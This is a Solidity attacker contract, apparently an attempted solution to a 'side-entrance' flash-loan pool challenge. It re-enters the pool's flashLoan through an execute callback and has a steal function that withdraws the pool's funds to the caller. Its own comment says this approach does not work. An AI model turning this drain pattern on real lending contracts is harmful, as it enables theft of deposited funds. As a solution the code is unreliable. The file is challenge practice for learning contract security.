// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import "contracts/side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract PoolAttackerBis {

    address payable private pool;
    address private owner;
    uint256 amount;

    constructor (address _pool){
        owner =msg.sender;
        pool = payable(_pool);
    }

    function attack(uint256 _amount) external {
        amount = _amount;
        ISideEntranceLenderPool(pool).flashLoan(amount);
    }

    //this solution do not work, because multiple time re-entrancy also means exiting multiple times
    //and as the balanceBefore variable of the victim contract is instantiate for each call
    //this cannot work
    function execute() external payable {
        console.log("msg.value");
        console.log(msg.value);
        console.log("pool.balance");
        console.log(address(pool).balance);
        if(address(pool).balance != 0 && msg.value != 0) {
            console.log("if");
            ISideEntranceLenderPool(pool).flashLoan(msg.value);
        }  
        else if (address(pool).balance == 0 && msg.value != 0) {
            console.log("else if");
            ISideEntranceLenderPool(pool).flashLoan(0);
        } 
        else {
            console.log("else");
            (bool success,) = pool.call{value:msg.value}("");
            require(success);
        }
    }


    function steal() external payable {
        ISideEntranceLenderPool(pool).withdraw();
        (bool success, ) = payable(msg.sender).call{value:amount}("");
        require(success, "failed to send ETH");
    }

    receive() external payable {}

}